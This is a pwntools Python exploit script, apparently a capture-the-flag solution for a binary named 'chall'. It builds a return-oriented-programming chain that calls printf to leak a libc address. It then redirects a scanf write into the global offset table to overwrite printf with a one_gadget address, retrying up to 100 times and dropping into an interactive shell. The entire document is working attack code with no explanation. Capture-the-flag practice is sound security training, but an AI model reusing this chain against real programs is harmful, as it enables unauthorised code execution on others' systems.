#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['wt.exe', 'wsl', '-d', 'Ubuntu']

exe = context.binary = ELF(args.EXE or './chall')

host = args.HOST or 'localhost'
port = int(args.PORT or 33132)

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *vuln
continue
'''.format(**locals())

# -- Exploit goes here --

rop = ROP(exe)
pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
rbp_scanf = 0x401199

for i in range(100):
    io = start()

    payload = flat(
        24 * p64(ret),
        exe.plt['printf'],
        ret,
        exe.plt['printf'],
        pop_rbp,
        exe.got['printf'] + 0x100,
        rbp_scanf,
    )

    print(hex(len(payload)))
    payload = payload.ljust(256, b'\0')
    io.sendafter(b'>> ', payload)

    try:
        io.recvline()
        leak = u64(io.recv(6).ljust(8, b'\0'))
        libc.address = leak - 0x62050
        log.success(f'{hex(leak) = }')
        log.success(f'{hex(libc.address) = }')

        one_gadget = libc.address + 0xebd43

        io.sendline(p64(one_gadget))
    except EOFError:
        io.close()
        continue
    io.interactive()

